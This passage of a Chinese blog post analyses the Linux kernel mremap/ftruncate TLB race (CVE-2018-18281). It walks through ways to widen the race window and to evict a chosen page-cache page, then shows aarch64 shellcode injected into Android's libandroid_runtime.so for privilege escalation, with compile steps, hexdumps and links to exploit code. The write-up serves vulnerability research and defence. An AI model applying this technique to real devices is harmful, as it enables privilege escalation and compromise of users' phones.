<li>page, 1185 行调用函数 free_swap_and_cache 释放了 pte 对应的 page cache, 将物理页面释放, 这是与 move_ptes 不同的地方</li>
</ul>
<p>将上述两个函数的流程放到一起分析, 假设下面这种情况:</p>
<p>假设一个进程有 A,B,C 三个线程:</p>
<ul>
<li>1) A 映射一个文件 a 到地址 X, 映射条件为: PROT_READ , MAP_SHARED</li>
<li>2) C 循环读取 X 的内容</li>
<li>3) A 调用 mremap 重新映射 X 到 Y, 这个调用会执行下面两个函数:<ul>
<li>3.1) move_ptes , 该函数做如下操作:<ul>
<li>3.1.1) 获取 X 页表和 Y 页表的锁</li>
<li>3.1.2) 遍历 X 对应页表的 pte , 释放之, 并在 Y 页表重建这些 pte </li>
<li>3.1.3) 释放 Y 页表的锁</li>
<li>3.1.4) 释放 X 页表的锁</li>
</ul>
</li>
<li>3.2) flush_tlb_range : 刷新 X 对应的 TLB 缓存 </li>
</ul>
</li>
<li>4) B 调用 ftruncate 将文件 a 的文件大小改为 0, 这个调用会执行下面操作:<ul>
<li>4.1) 获取 Y 页表的锁</li>
<li>4.2) 删除 Y 对应的页表</li>
<li>4.3) 释放 Y 对应的 pages</li>
<li>4.4) 刷新 Y 对应的 TLB 缓存</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">说明: </span><br><span class="line"></span><br><span class="line">实际上 X 和 Y 是两块内存区域, 也就是说可能比一个 pmd 所容纳的地址范围大, </span><br><span class="line">不管是 mremap 还是 ftruncate, 底层实现会将 X 和 Y 按照 pmd 为单位循环执行上表的操作, </span><br><span class="line">即上表所说的 X 页表实际指的是 X 内存区域里的某个 pmd, 这里是为了表达方便简化处理, </span><br><span class="line">下面的描述也是一样.</span><br></pre></td></tr></table></figure>

<p>这里存在的竞态条件是当 4.3 已经执行完毕 (3.1.3 释放 Y 锁 4.1 就可以执行), 地址 Y 的内存已经释放, 物理页面已经返回给 <a href="https://en.wikipedia.org/wiki/Buddy_memory_allocation" target="_blank" rel="noopener">伙伴系统</a> , 并再一次分配给新的虚拟内存, 而此时 3.2 还没有执行, 这种情况下, 虽然 X 的映射关系在页表里已经被清空, 但在 TLB 缓存里没有被清空, 线程 C 依然可以访问 X 的内存, 造成地址复用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注意:</span><br><span class="line"></span><br><span class="line">除了可以用 ftruncate 函数来跟 mremap 竞争, 还有一个 linux 系统特有的</span><br><span class="line">系统函数 fallocate 也可以起到同样的效果, 原因很简单, </span><br><span class="line">fallocate 和 ftruncate 的底层调用链是一样的</span><br><span class="line"></span><br><span class="line">sys_fallocate()-&gt;shmem_fallocate()-&gt;shmem_truncate_range()</span><br><span class="line">-&gt;shmem_undo_range()-&gt;truncate_inode_page()-&gt;unmap_mapping_range</span><br></pre></td></tr></table></figure>

<p>v4.9 之前的内核都是上述列表显示的代码逻辑</p>
<p>v4.9 之后的内核, move_ptes 的逻辑与上述有些许不同 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注意:</span><br><span class="line"></span><br><span class="line">在 versions &gt; 4.9 的 linux 内核, Dirty 标记的页面会在 move_ptes 函数内部刷新 TLB , </span><br><span class="line">而不是等到 3.2 由 flush_tlb_range 函数去刷新, 因此, race 发生之后, </span><br><span class="line">线程 C 能通过 X 访问到的内存都是之前 non-Dirty 的页面, 即被写过的页面都无法复用. </span><br><span class="line"></span><br><span class="line">这点改变会对 poc 和 exploit 造成什么影响? 留给大家思考.</span><br></pre></td></tr></table></figure>

<h2 id="简单版的-poc"><a href="#简单版的-poc" class="headerlink" title="简单版的 poc"></a>简单版的 poc</h2><p>根据上述分析, 一个简单的 poc 思路就出来了, 通过不断检测线程 C 从地址 X 读取的内容是不是初始内容就可以判断 race 是否被触发, 正常情况下, C 读取 X 只会有两种结果, 一种是 mremap 彻底完成, 即 3.2 执行完毕, 此时地址 X 为无效地址, C 的读操作引发进程奔溃退出, 第二种是 mremap 还未完成, C 读取的地址返回的是 X 的初始内容, 只有这两种情况才符合 mremap 函数的定义. 但是由于漏洞的存在, 实际运行会存在第三种情况, 即 C 读取 X 不会奔溃(3.2 还没执行, 地址映射还有效), 但内容变了( 4.3 执行完毕, 物理页面已经被其他地方复用)</p>
<p><a href="https://github.com/jiayy/android_vuln_poc-exp/tree/master/CVE-2018-18281" target="_blank" rel="noopener">这份 poc</a> 可以清晰看出 race 是怎么发生的, 需要注意, 这份 poc 必须配合内核补丁才能稳定触发 race , 否则命中率非常低, 补丁通过在 move_page_tables 函数调用 flush_tlb_range 之前(即 3.2 之前)增加一个大循环来增大 race 条件的时间窗口以提高命中率</p>
<p>上述 poc 的运行结果是, 大部分情况下 poc 奔溃退出, 少数情况下读取 X 会返回一个被其他地方复用的页面</p>
<p>这离稳定提权还有很远的距离, 为了得到稳定利用, 至少有两个问题需要解决:</p>
<ul>
<li>如何提高 race 的命中率</li>
<li>怎么实现提权</li>
</ul>
<h2 id="如何提高-race-的命中率"><a href="#如何提高-race-的命中率" class="headerlink" title="如何提高 race 的命中率"></a>如何提高 race 的命中率</h2><p>要提高本漏洞 race 的命中率, 就是要增大 move_ptes 函数和 flush_tlb_range 函数之间的时间间隔</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">怎么才能增加这俩函数执行的时间间隔呢?</span><br></pre></td></tr></table></figure>

<p>这里要引入linux内核的 <a href="https://en.wikipedia.org/wiki/Linux_kernel#PREEMPTION" target="_blank" rel="noopener">进程抢占</a> 概念, 如果目标内核是可抢占的 (CONFIG_PREEMPT=y) , 则如果能让进程在执行 flush_tlb_range 函数之前被抢占, 那么 race 的时间窗口就够大了, 用户空间的普通程序能不能影响某个进程的调度策略呢? 答案是肯定的.</p>
<p>有两个系统函数可以影响进程的调度</p>
<ul>
<li><a href="http://man7.org/linux/man-pages/man2/sched_setaffinity.2.html" target="_blank" rel="noopener">sched_setaffinity</a> 函数用来绑定进程到某个 cpu core</li>
<li><a href="http://man7.org/linux/man-pages/man2/sched_setscheduler.2.html" target="_blank" rel="noopener">sched_setscheduler</a> 函数用来设置进程的调度策略和调度参数</li>
</ul>
<p>使用这两个函数将 poc 修改为下面的方案,</p>
<p>新建 A,B,C,D 四个线程:</p>
<ul>
<li>1) A 映射一个文件 a 到地址 X, A 绑定到核 c1, A 调度策略设置为 SCHED_IDLE </li>
<li>2) C 绑定到核 c1, C 阻塞在某个 pipe, pipe 返回则调用 ftruncate 将文件 a 的文件大小改为 0</li>
<li>3) A 调用 mremap 重新映射 X 到 Y, 这将执行下面两个函数:<ul>
<li>3.1) move_ptes</li>
<li>3.2) flush_tlb_range</li>
</ul>
</li>
<li>4) D 绑定到核 c2, 监控进程的内存映射情况,如果发生变化则通过写 pipe 唤醒 C</li>
<li>5) B 绑定到核 c3, 循环读取 X 的内容, 并判断是否还是初始值</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注意:</span><br><span class="line"></span><br><span class="line">mremap 执行 move_ptes 函数会引发内存状态变化, 这种变化可以通过</span><br><span class="line">用户态文件 /proc/pid/status 文件获取, 这就是线程 D 的作用</span><br></pre></td></tr></table></figure>

<p>此时, 通过监控线程 D 唤醒 C, 由于A 和 C 绑定在同一个核心 c1, 且 A 的调度策略被设置<br>为最低优先级 SCHED_IDLE, C 的唤醒将抢占 A 的执行, 如此一来, 3.2 的执行就可能被延迟.<br>C 被唤醒后立即执行 ftruncate 释放 Y 的内存触发漏洞.</p>
<p>通过上述方案可以理论上让线程 A 在执行 3.1 后, 执行 3.2 前被挂起,<br>从而扩大 3.1 和 3.2 的时间间隔 </p>
<p><a href="https://github.com/jiayy/android_vuln_poc-exp/blob/master/CVE-2018-18281-Android/poc.old.c" target="_blank" rel="noopener">这个 poc</a> 是根据上述思路写的</p>
<h2 id="改进版的-poc"><a href="#改进版的-poc" class="headerlink" title="改进版的 poc"></a>改进版的 poc</h2><p>实测发现上述 poc 触发率还是低, 借鉴 Jann Horn 的思路, 继续如下修改 poc </p>
<p>改进版方案: 新建 A,B,C,D,E 五个线程:</p>
<ul>
<li>1) A 映射一个文件 a 到地址 X, A 绑定到核 c1, A 调度策略设置为 SCHED_IDLE </li>
<li>2) C 绑定到核 c1, C 阻塞在某个 pipe, pipe 返回则立即将 A 重新绑定到核 c4, 并调用 ftruncate 将文件 a 的文件大小改为 0</li>
<li>3) A 调用 mremap 重新映射 X 到 Y<ul>
<li>3.1) move_ptes</li>
<li>3.2) flush_tlb_range</li>
</ul>
</li>
<li>4) D 绑定到核 c2, 监控进程的内存映射情况,如果发生变化则通过写 pipe 唤醒 C</li>
<li>5) B 绑定到核 c3, 循环读取 X 的内容, 并判断是否还是初始值</li>
<li>6) E 绑定到核 c4, 执行一个死循环.</li>
</ul>
<p>改进的地方有两点, 1 是增加一个 E 线程绑定到核 c4 并执行死循环, 2 是线程 C 被唤醒后立刻重绑定线程 A 到核 c4, 即让 A 和 E 在同一个核上</p>
<p>这个改变会提高 race 触发的命中率, 个人判断原因是由于当 C 的管道返回后手动执行重绑定操作会比执行其他操作更容易导致 A 立即被挂起 </p>
<p><a href="https://github.com/jiayy/android_vuln_poc-exp/blob/master/CVE-2018-18281-Android/poc.c" target="_blank" rel="noopener">改进版 poc 代码</a> 是根据上述思路写的</p>
<p>利用这个 poc, 我们可以将这个漏洞的 race 命中率提升到可以接受的程度.</p>
<h2 id="物理页面管理"><a href="#物理页面管理" class="headerlink" title="物理页面管理"></a>物理页面管理</h2><p>现在我们可以在比较短的时间内稳定触发漏洞, 得到一片已经被释放的物理页面的使用权,<br>而且可读可写, 怎么利用这一点来提权?</p>
<p>这里需要了解物理内存的分配和释放细节, 物理内存管理属于<a href="https://en.wikipedia.org/wiki/Buddy_memory_allocation" target="_blank" rel="noopener">伙伴系统</a>, 参考 <a href="https://github.com/pjhades/tolarian-academy/blob/master/linux-mm.md" target="_blank" rel="noopener">内存管理</a></p>
<p>物理页面的管理是分层的:</p>
<ul>
<li>node: NUMA 体系架构有 node 的概念, 不同 node 的物理内存是分开管理的</li>
<li>zone: 根据物理内存的区域分若干种 zone, 不同场景会优先向不同的 zone 分配 , 比如用户空间申请内存, 会优先从 ZONE_NORMAL 这个 zone 分配, 如果不够再从其他 zone 分配<ul>
<li>ZONE_DMA</li>
<li>ZONE_NORMAL</li>
<li>ZONE_HIGHMEM</li>
<li>其他</li>
</ul>
</li>
<li>migration-type: 内核根据可迁移性对页面进行分组管理, 用于 anti-fragmentation, 可以参考 <a href="https://www.jeanleo.com/2018/09/06/%E3%80%90linux%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91%E9%A1%B5%E9%9D%A2%E8%BF%81%E7%A7%BB/" target="_blank" rel="noopener">内核页面迁移与反碎片机制</a> <ul>
<li>MIGRATE_UNMOVABLE</li>
<li>MIGRATE_RECLAIMABLE</li>
<li>MIGRATE_MOVABLE</li>
</ul>
</li>
</ul>
<p>__alloc_pages_nodemask 函数是 zoned buddy allocator 的分配入口, 它有快慢两条路径:</p>
<ul>
<li>get_page_from_freelist , 快路径<ul>
<li>1) if order == 0, 从 per-cpu 的指定 zone 指定 migratetype 的 cache list 里获取 page<ul>
<li>pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp</li>
<li>list = &amp;pcp-&gt;lists[migratetype]</li>
<li>page = list_entry(list-&gt;next, struct page, lru);</li>
</ul>
</li>
<li>2) __rmqueue_smallest : 在指定迁移类型下自底向上进行各阶遍历查找所需的空闲页面<ul>
<li>area = &amp;zone-&gt;free_area[current_order]</li>
<li>list = &amp;area-&gt;free_list[migratetype]</li>
<li>page = list_entry(list-&gt;next, struct page, lru);</li>
</ul>
</li>
<li>3) __rmqueue_cma, <a href="https://www.jeanleo.com/2018/09/07/%E3%80%90linux%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91%E8%BF%9E%E7%BB%AD%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%99%A8%EF%BC%88cma%EF%BC%89/" target="_blank" rel="noopener">连续内存分配器</a> 用于DMA映射框架下提升连续大块内存的申请</li>
<li>4) __rmqueue_fallback, 如果在指定迁移类型下分配失败，且类型不为MIGRATE_RESERVE时, 就在 fallbacks 数组里找到下一个 migratetype, 由此获得的阶号和迁移类型查找zone-&gt;free_area[]-&gt;free_list[]空闲页面管理链表</li>
</ul>
</li>
<li>__alloc_pages_slowpath, 慢路径<ul>
<li>略</li>
</ul>
</li>
</ul>
<p>从漏洞利用的角度, 我们希望将漏洞释放的物理页面尽可能快的被重新分配回来, 所以, 用来触发漏洞释放物理页面的场景和重新申请物理页面用来利用的场景, 这两种场景的 zone, migratetype 最好一致, 而且这两个场景的触发最好在同一个 cpu core 上.</p>
<p>比如, 触发漏洞时, 通过用户空间 mmap 一片地址, 然后访问这片地址触发物理内存分配, 这种分配大概率是从 ZONE_NORMAL 而来, 而且页面大概率是 MIGRATE_MOVABLE 的, 然后用 ftruncate 释放, 这些页面很可能会挂在当前 cpu 的 freelist 上.  所以, 漏洞利用的时候如果是在其他 cpu core 触发申请物理页面, 则可能申请不到目标页面, 或者, 触发申请物理页面的场景如果是某种 dma 设备, 那么也大概率命中不到目标页面.</p>
<h2 id="怎么实现提权"><a href="#怎么实现提权" class="headerlink" title="怎么实现提权"></a>怎么实现提权</h2><p>根据上述物理内存管理的分析, 选择使用文件的 page cache 用于重新申请目标物理页面, 在此基础上, 想办法实现提权</p>
<p>linux 上硬盘文件的内容在内核用 page cache 来维护, 如果漏洞触发后释放的页面被用于某个文件的 page cache, 则我们拥有了读写该文件的能力, 如果这个文件恰好是用户态的重要动态库文件, 正常情况下普通进程无法改写这种文件, 但通过漏洞普通进程可以改写它, 这样就可以通过修改动态库文件的代码段来提权.</p>
<p>上述利用思路的关键有3点:</p>
<ul>
<li>选择目标动态库文件</li>
<li>选择目标文件要改写的位置</li>
<li>提高目标位置所在页面的命中率</li>
</ul>
<p>这个动态库必须是能被高权限进程所使用<br>目标位置最好是页面对齐的, 这样目标位置可以以页面为单位加载进内存, 或者以页面为单位置换到硬盘<br>目标位置被调用的时机不能太频繁, 要不然修改操作会影响系统稳定性, 而且调用时机必须可以由普通进程触发</p>
<p>下面是一个符合上述条件的动态库和函数:</p>
<ul>
<li>libandroid_runtime.so 动态库</li>
<li>com_android_internal_os_Zygote_nativeForkAndSpecialize 函数<ul>
<li>这个函数被 zygote 调用, zygote 进程是一个特权进程</li>
<li>这个函数在 libandroid_runtime.so (pixel2 PQ1A.181105.017.A1) 文件的偏移是 0x157000, 这个偏移是页面对齐的</li>
<li>这个函数一般情况下不会被调用, 只有启动新的 app 时会被 zygote 调用, 可以由普通 app 触发 zygote 去执行</li>
</ul>
</li>
</ul>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>漏洞触发 race 后, 让释放的物理页面刚好被用于目标页面( libandroid_runtime.so 文件的 offset = 0x157000 这个页面), 再可以通过 UAF 地址注入 shellcode 到目标位置, 从而改写 com_android_internal_os_Zygote_nativeForkAndSpecialize 函数的代码逻辑, 最后发消息触发 zygote 去执行 shellcode</p>
<p><span id="raise_pagecache_hit"></span></p>
<h2 id="如何提高文件-page-cache-命中率"><a href="#如何提高文件-page-cache-命中率" class="headerlink" title="如何提高文件 page cache 命中率"></a>如何提高文件 page cache 命中率</h2><p>这节解决的问题是, 怎么控制 race 释放的页面刚好能被目标页面使用</p>
<p><a href="https://arxiv.org/pdf/1710.00551.pdf" target="_blank" rel="noopener">这篇论文</a> 的 section VIII-B 介绍了一种算法用于精确控制一个 file page cache 的加载 </p>
<ul>
<li>1) 打开一个大文件 a, mmap 到内存 </li>
<li>2) 打开目标文件 b, mmap 到内存</li>
<li>3) 在一个循环内, 执行: <ul>
<li>3.1) 按照 pagesize 逐页面读取 a 的内容<pre><code>这会导致内核申请大量 page cache 来装载文件 a, </code></pre>  从而迫使其他文件的 page cache 被置换到硬盘</li>
<li>3.2) 判断目标页面 X 是否在内存里, 如果不是, 跳转到 4.1</li>
</ul>
</li>
<li>4) 在一个循环内, 执行:<ul>
<li>4.1) 按照 pagesize 逐页面读取 b 的内容, 但遇到目标页面 X 则跳过<pre><code>这会导致目标文件除目标页面 X 之外其他页面被重新装载回内存</code></pre></li>
<li>4.2) 判断目标页面 X 是否在内存里, 如果是, 跳转到 3.1</li>
</ul>
</li>
<li>5) 如果读取完全部 b 的内容, 目标页面 X 仍然没有在内存里, 结束.</li>
</ul>
<p>通过上述算法, 可以让一个目标文件的目标页面 X 被置换到硬盘, 而该文件其他页面保留在内存里, 这样在漏洞触发之后, 再来访问目标页面, 则很大机会会分配刚刚释放的物理页面给目标页面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注意:</span><br><span class="line"></span><br><span class="line">mincore 函数可以用来判断一个区域内的内存是在物理内存中或被交换出磁盘</span><br><span class="line">上述算法在 linux 的实现依赖于 mincore</span><br></pre></td></tr></table></figure>

<h2 id="exploit-code"><a href="#exploit-code" class="headerlink" title="exploit code"></a>exploit code</h2><p>我改了一份exploit 代码 <a href="https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2018-18281" target="_blank" rel="noopener">在这里</a>, 主要包含下面几个文件:</p>
<ul>
<li>compile.sh</li>
<li>shellcode.s</li>
<li>exp.c</li>
<li>watchdog.c</li>
</ul>
<h3 id="compile-sh"><a href="#compile-sh" class="headerlink" title="compile.sh"></a>compile.sh</h3><p>这是编译脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1) aarch64-linux-gnu-as arm_shellcode.s -o arm_shellcode.o  </span><br><span class="line">2) aarch64-linux-gnu-ld arm_shellcode.o -o arm_shellcode </span><br><span class="line">3) aarch64-linux-gnu-objcopy --dump-section .text=arm_shellcode.bin arm_shellcode </span><br><span class="line">4) xxd -i arm_shellcode.bin &gt; arm_shellcode.h </span><br><span class="line">5) make</span><br></pre></td></tr></table></figure>
<p>1~3 是将汇编文件 arm_shellcode.s 编译成二进制并将可执行文件的代码段 (.text) 提取到文件 arm_shellcode.bin </p>
<p>4 使用 linux 的 xxd 工具将 arm_shellcode.bin 放进一个 c 语言分格的数组，后续在 c 代码里以数组变量的形式操作它</p>
<p>5 根据 Android.mk 编译可执行文件</p>
<h2 id="shellcode-s"><a href="#shellcode-s" class="headerlink" title="shellcode.s"></a>shellcode.s</h2><p>下面简单看一下 shellcode.s 汇编,不感兴趣可以略过</p>
<ul>
<li><p>shellcode.s 本身很简单: 读取文件 “/proc/self/attr/current” ，然后将读取的内容作为参数调用 sethostname 函数，从而更改系统的 hostname</p>
</li>
<li><p>因为普通 app 没有权限调用系统函数 ‘sethostname’, 本 exploit 通过注入 shellcode.s 到 libandroid_runtime.so, 然后触发 zygote 进程执行 shellcode.s 达到越权执行的目的</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// open file</span></span><br><span class="line">_start:</span><br><span class="line">mov x0, #<span class="number">-100</span></span><br><span class="line">adrp x1, _start</span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> We are changing the page-relative alignment of the shellcode, so normal</span></span><br><span class="line"><span class="comment">// aarch64 RIP-relative addressing doesn't work.</span></span><br><span class="line">add x1, x1, attr_path-file_start</span><br><span class="line">mov x2, #<span class="number">0</span></span><br><span class="line">mov x8, #<span class="number">0x38</span></span><br><span class="line">svc #<span class="number">0</span></span><br><span class="line"></span><br><span class="line">attr_path:</span><br><span class="line">.ascii <span class="string">"/proc/self/attr/current\0"</span></span><br></pre></td></tr></table></figure>

<p>第一段汇编作用是 open 文件 “/proc/self/attr/current”, #0x38 是系统调用号，对应系统调用 __NR_openat (系统调用号定义： include/uapi/asm-generic/unistd.h), 将 0x38 放入 x8 寄存器，svc #0 指令触发软中断，进入内核系统调用, 根据 openat 函数的定义, x1 寄存器存放要打开的文件路径的地址, x0 和 x2 这里忽略.</p>
<p>这段汇编执行后，x0寄存器存放返回值，即打开文件的 fd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// read from file</span></span><br><span class="line">sub sp, sp, #<span class="number">128</span></span><br><span class="line">mov x1, sp</span><br><span class="line">mov x2, #<span class="number">128</span></span><br><span class="line">mov x8, #<span class="number">0x3f</span></span><br><span class="line">svc #<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>第二段汇编执行 read 系统调用，读取 128 字节放入栈, #0x3f 对应系统调用 read, x0 存放要读取文件的 fd, x1 是栈顶指针 sp, 在此之前，sp 被移动了#128 字节，相当于一个 128 字节的栈数组作为 buf传给 read 函数第二个参数, x2 是要读取的长度, 这里是 128</p>
<p>这段汇编执行后, sp 指向的位置存放文件 ‘/proc/self/attr/current’ 的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shove file contents into hostname</span></span><br><span class="line">mov x1, x0</span><br><span class="line">mov x0, sp</span><br><span class="line">mov x8, #<span class="number">0xa1</span></span><br><span class="line">svc #<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>第三段汇编执行 sethostname 系统调用, #0xa1 对应系统调用 sethostname, x0 即要更新的域名字符串, 这里放入 sp 指针， 即将上一步 read 函数读取的 buf 值作为 sethostname 的参数 name, x1 是长度, 这里值是上一步read 的返回值</p>
<p>这段汇编执行后, hostname 将被更新为文件 ‘/proc/self/attr/current’ 的内容</p>
<h2 id="watchdog-c"><a href="#watchdog-c" class="headerlink" title="watchdog.c"></a>watchdog.c</h2><p>这个文件的作用是不断调用 exp 可执行文件并监控 exploit 是否成功, 之所以需要这个主调程序是由于这个漏洞在触发的时候, 大部分情况会引发程序奔溃, 这时候需要一个看门狗程序不断重启它</p>
<h2 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h2><p>这个文件实现了 exploit 的主体功能</p>
<ul>
<li>kickout_victim_page 函数</li>
<li>idle_worker 线程</li>
<li>spinner 线程</li>
<li>nicer_spinner 线程</li>
<li>read_worker 线程</li>
<li>segv_handler 函数</li>
</ul>
<p>kickout_victim_page 函数实现了 <a href="#raise_pagecache_hit">如何提高文件 page cache 命中率</a> 的算法, 最开始执行</p>
<p>idle_worker 线程用于触发 mremap 调用, 先绑定到 c1, spinner 唤醒后重绑定 idle_worker 到 c3, 调度策略为 SCHED_IDLE , 其他线程都是普通调度策略</p>
<p>spinner 线程用于触发 fallocate (跟 ftruncate 效果类似) 调用, 绑定到 c2 </p>
<p>nicer_spinner 线程绑定到 c3, 用于抢占 idle_worker  的 cpu 使用权</p>
<p>read_worker 线程绑定到 c4, 用于监控目标内存, 一旦发现 race 成功触发, 则注入 shellcode 到目标内存</p>
<p>segv_handler 函数是段错误处理函数, 这里会再一次检测 shellcode 是否已经成功注入到目标文件, 如果是, 则通知 watchdog 停止重启 exp</p>
<p>执行 exploit 之前, libandroid_runtime.so 如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">adb pull /system/lib64/libandroid_runtime.so</span><br><span class="line"></span><br><span class="line">root@jiayy:CVE-2018-18281<span class="comment"># xxd -s 0x157000 -l 100 libandroid_runtime.so </span></span><br><span class="line">00157000: 0871 0091 5f00 08eb c000 0054 e087 41a9  .q.._......T..A.</span><br><span class="line">00157010: e303 1f32 0800 40f9 0801 43f9 0001 3fd6  ...2..@...C...?.</span><br><span class="line">00157020: 2817 40f9 a983 5af8 1f01 09eb e110 0054  (.@...Z........T</span><br><span class="line">00157030: ff03 1191 fd7b 45a9 f44f 44a9 f657 43a9  .....&#123;E..OD..WC.</span><br><span class="line">00157040: f85f 42a9 fa67 41a9 fc6f c6a8 c003 5fd6  ._B..gA..o...._.</span><br><span class="line">00157050: f801 00b0 d901 00b0 ba01 00f0 7b02 00f0  ............&#123;...</span><br><span class="line">00157060: 9c01 0090</span><br></pre></td></tr></table></figure>

<p>执行 exploit 之后, libandroid_runtime.so 如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">adb pull /system/lib64/libandroid_runtime.so</span><br><span class="line"></span><br><span class="line">root@jiayy:CVE-2018-18281<span class="comment"># xxd -s 0x157000 -l 100 libandroid_runtime.so </span></span><br><span class="line">00157000: 0000 20d4 0000 20d4 600c 8092 0100 0090  .. ... .`.......</span><br><span class="line">00157010: 2120 0191 0200 80d2 0807 80d2 0100 00d4  ! ..............</span><br><span class="line">00157020: ff03 02d1 e103 0091 0210 80d2 e807 80d2  ................</span><br><span class="line">00157030: 0100 00d4 e103 00aa e003 0091 2814 80d2  ............(...</span><br><span class="line">00157040: 0100 00d4 0000 0014 2f70 726f 632f 7365  ......../proc/se</span><br><span class="line">00157050: 6c66 2f61 7474 722f 6375 7272 656e 7400  lf/attr/current.</span><br><span class="line">00157060: eaff ff17                                ....</span><br></pre></td></tr></table></figure>

<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1695" target="_blank" rel="noopener">mremap TLB flush too late with concurrent ftruncate</a></li>
<li><a href="https://googleprojectzero.blogspot.com/2019/01/taking-page-from-kernels-book-tlb-issue.html" target="_blank" rel="noopener">Taking a page from the kernel’s book: A TLB issue in mremap</a></li>
<li><a href="http://140.120.7.21/LinuxRef/mmLinux/VmOutline/pagecache.html" target="_blank" rel="noopener">Swapping and the Page Cache</a></li>
<li><a href="https://lkml.org/lkml/2018/11/2/423" target="_blank" rel="noopener">patch 讨论</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/03/08/cve-2018-18281/" data-id="cmd5slr2c000f0lo1gfm1gmio" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="page-number" href="page/3/">3</a><a class="extend next" rel="next" href="page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="archives/2023/03/">三月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2021/12/">十二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2019/03/">三月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2018/04/">四月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2017/12/">十二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" 